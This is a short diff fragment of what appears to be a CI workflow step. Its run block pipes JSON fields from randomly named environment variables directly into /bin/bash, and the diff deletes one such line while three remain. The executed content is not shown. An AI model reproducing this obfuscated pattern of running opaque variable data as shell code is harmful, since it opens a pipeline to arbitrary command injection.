@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$xpfqb931" | jq -r .b8 | /bin/bash
           echo $avmiz0687 | jq -r .tpvx755 | /bin/bash
-          echo $tjqs17408 | jq -r .h98 | /bin/bash
           printf '%s' "$x57920" | jq -r .rcth13 | /bin/bash
 
       - name: Store artifact
